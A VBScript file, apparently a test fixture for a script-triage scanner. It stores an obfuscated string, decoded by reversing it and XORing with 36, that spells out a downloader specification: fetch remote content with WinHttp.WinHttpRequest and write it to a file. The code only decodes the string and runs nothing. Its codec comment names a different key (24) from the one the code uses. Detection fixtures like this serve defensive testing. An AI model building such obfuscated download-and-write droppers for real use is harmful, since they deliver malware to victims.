Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_26f2eba5 = "80-69-64-10-70-66-21-19-20-19-69-22-64-17-9-65-67-69-80-87-120-70-69-104-87-87-65-86-80-74-81-108-120-71-77-72-70-81-116-120-87-86-65-87-113-120-30-103-25-76-80-69-84-123-65-72-77-66-88-70-66-21-19-20-19-69-22-64-17-11-70-69-104-87-87-65-86-80-74-81-108-25-80-74-65-67-69-123-86-65-87-81-88-80-69-64-10-23-18-28-65-19-16-70-20-11-64-77-72-69-82-74-77-10-65-72-84-73-69-92-65-10-70-66-21-19-20-19-69-22-64-17-11-11-30-87-84-80-80-76-25-72-86-81-88-70-66-21-19-20-19-69-22-64-17-9-74-67-77-69-84-73-69-71-25-64-77-123-74-67-77-69-84-73-69-71-88-22-25-80-74-81-75-71-123-65-67-69-80-87-88-21-10-17-10-80-87-65-81-85-65-118-84-80-80-108-74-77-115-10-84-80-80-108-74-77-115-25-86-65-80-84-69-64-69-88-65-72-77-66-123-65-80-77-86-83-8-65-80-75-73-65-86-123-65-86-77-81-85-71-69-25-87-84-65-80-87-88-21-25-82"
Const Codec_26f2eba5 = "decimal_dash|reverse_then_xor|24"

Function Load_26f2eba5()
  Dim parts, result(), v_e598
  parts = Split(Material_26f2eba5, "-")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(v_e598) = CInt(parts(v_e598))
  Next
  Load_26f2eba5 = result
End Function

Function Decode_26f2eba5(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  For v_e598 = 0 To UBound(v_a19c)
    result(UBound(v_a19c) - v_e598) = v_a19c(v_e598) Xor 36
  Next
  Decode_26f2eba5 = result
End Function

Function Recover_26f2eba5()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  If (2 > 1) Then v_d41a = "left" Else v_d41a = "right"
  v_a19c = Load_26f2eba5()
  Select Case 1
    Case 1
      v_b27e = Decode_26f2eba5(v_a19c)
    Case Else
      v_b27e = Array()
  End Select
  v_c304 = ""
  For v_e598 = 0 To UBound(v_b27e)
    v_c304 = v_c304 & Chr(v_b27e(v_e598))
  Next
  Recover_26f2eba5 = v_c304
End Function

Function Inspect_26f2eba5()
  Dim fields
  fields = Split(Recover_26f2eba5(), "|")
  Inspect_26f2eba5 = Join(fields, "|")
End Function
